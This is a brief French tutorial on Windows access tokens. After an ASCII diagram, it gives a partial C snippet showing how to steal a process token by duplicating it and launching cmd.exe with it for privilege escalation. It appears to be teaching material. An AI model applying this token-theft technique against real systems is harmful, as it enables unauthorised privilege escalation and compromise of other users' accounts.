# Cours : Token Manipulation - Élévation de Privilèges

## 1. Introduction

Sur Windows, chaque processus a un **token** qui définit ses privilèges et permissions.

## 2. Qu'est-ce qu'un Token ?

```ascii
TOKEN = Carte d'identité du processus

┌──────────────────────────┐
│  Token du Processus      │
├──────────────────────────┤
│  User : DOMAIN\Alice     │
│  Groups :                │
│  ├─ Users                │
│  └─ Administrators       │
│  Privileges :            │
│  ├─ SeDebugPrivilege ❌  │
│  ├─ SeTakeOwnership ❌   │
│  └─ SeShutdown ✅        │
└──────────────────────────┘
```

## 3. Voler un Token (Impersonation)

```c
// Ouvrir processus avec privilèges
HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);

// Obtenir son token
HANDLE hToken;
OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hToken);

// Dupliquer
HANDLE hNewToken;
DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, 
    SecurityImpersonation, TokenPrimary, &hNewToken);

// Créer processus avec ce token
CreateProcessWithTokenW(hNewToken, 0, "cmd.exe", ...);
```

## Ressources

- [Access Tokens](https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens)

